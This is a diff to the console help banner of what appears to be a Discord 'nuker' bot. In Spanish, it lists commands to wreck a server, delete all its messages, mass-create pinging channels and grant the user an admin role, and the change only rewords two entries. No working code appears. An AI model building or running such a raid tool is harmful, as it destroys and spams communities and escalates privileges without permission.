@@ -22,8 +22,8 @@ console.log(chalk.white(`
 
                                                ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
                                                │                                                                  │
-                                               │          ${chalk.green('• .start')} = Envia el servidor a la mierda                │
-                                               │          ${chalk.green('• .nuke')} = Elimina todos los chats del servidor          │
+                                               │          ${chalk.green('• .start')} = Envia el sv a la mierda                │
+                                               │          ${chalk.green('• .nuke')} = Elimina todos los mensajes del servidor          │
                                                │          ${chalk.green('• .fuck')} = Crea muchos canales con ping en ellos         │
                                                │          ${chalk.green('• .adm')} = Crea un rol con admin y te lo da               │
                                                │                                                                  │
